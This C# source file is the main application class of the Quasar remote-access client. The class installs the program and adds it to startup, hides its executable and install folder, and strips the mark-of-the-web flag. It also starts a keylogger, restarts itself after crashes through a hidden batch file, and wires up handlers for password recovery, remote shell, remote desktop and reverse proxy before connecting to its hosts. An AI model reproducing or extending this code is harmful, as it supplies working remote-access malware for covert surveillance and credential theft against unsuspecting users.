using Quasar.Client.Config;
using Quasar.Client.IO;
using Quasar.Client.Logging;
using Quasar.Client.Messages;
using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Client.Utilities;
using Quasar.Common.DNS;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Quasar.Client
{
    public class QuasarApplication
    {
        public SingleInstanceMutex ApplicationMutex;
        public QuasarClient ConnectClient;
        private readonly List<IMessageProcessor> _messageProcessors;
        private KeyloggerService _keyloggerService;

        private bool IsInstallationRequired => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;

        public QuasarApplication()
        {
            AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;
            _messageProcessors = new List<IMessageProcessor>();
        }

        public void Run()
        {
            // decrypt and verify the settings
            if (Settings.Initialize())
            {
                ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);

                // check if process with same mutex is already running on system
                if (ApplicationMutex.CreatedNew)
                {
                    FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);

                    if (IsInstallationRequired)
                    {
                        // close mutex before installing the client
                        ApplicationMutex.Dispose();
                        new ClientInstaller().Install();
                    }
                    else
                    {
                        // (re)apply settings and proceed with connect loop
                        ApplySettings();
                        var hosts = new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS));
                        ConnectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
                        InitializeMessageProcessors(ConnectClient);
                        ConnectClient.ConnectLoop();
                    }
                }
            }

            Cleanup();
            Exit();
        }

        private static void Exit()
        {
            // Don't wait for other threads
            Environment.Exit(0);
        }

        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            if (e.IsTerminating)
            {
                string batchFile = BatchFile.CreateRestartBatch(Application.ExecutablePath);
                if (string.IsNullOrEmpty(batchFile)) return;

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);
                Exit();
            }
        }

        private void Cleanup()
        {
            CleanupMessageProcessors();
            _keyloggerService?.Dispose();
            ApplicationMutex.Dispose();
        }

        private void InitializeMessageProcessors(QuasarClient client)
        {
            _messageProcessors.Add(new ClientServicesHandler(this, client));
            _messageProcessors.Add(new FileManagerHandler(client));
            _messageProcessors.Add(new KeyloggerHandler());
            _messageProcessors.Add(new MessageBoxHandler());
            _messageProcessors.Add(new PasswordRecoveryHandler());
            _messageProcessors.Add(new RegistryHandler(client));
            _messageProcessors.Add(new RemoteDesktopHandler(client));
            _messageProcessors.Add(new RemoteShellHandler(client));
            _messageProcessors.Add(new ReverseProxyHandler(client));
            _messageProcessors.Add(new ShutdownHandler());
            _messageProcessors.Add(new StartupManagerHandler());
            _messageProcessors.Add(new SystemInformationHandler());
            _messageProcessors.Add(new TaskManagerHandler(client));
            _messageProcessors.Add(new TcpConnectionsHandler(client));
            _messageProcessors.Add(new UserStatusHandler(client));
            _messageProcessors.Add(new WebsiteVisitorHandler());

            foreach (var msgProc in _messageProcessors)
                MessageHandler.Register(msgProc);
        }

        private void CleanupMessageProcessors()
        {
            foreach (var msgProc in _messageProcessors)
            {
                MessageHandler.Unregister(msgProc);
                msgProc.Dispose();
            }
        }

        private void ApplySettings()
        {
            FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);

            if (Settings.STARTUP)
            {
                Startup.AddToStartup();
            }

            if (Settings.INSTALL && Settings.HIDEFILE)
            {
                try
                {
                    File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
                }
                catch (Exception)
                {
                }
            }

            if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
            {
                try
                {
                    DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLPATH));
                    di.Attributes |= FileAttributes.Hidden;
                }
                catch (Exception)
                {
                }
            }

            if (Settings.ENABLELOGGER)
            {
                _keyloggerService = new KeyloggerService();
                _keyloggerService.StartService();
            }
        }
        
    }
}
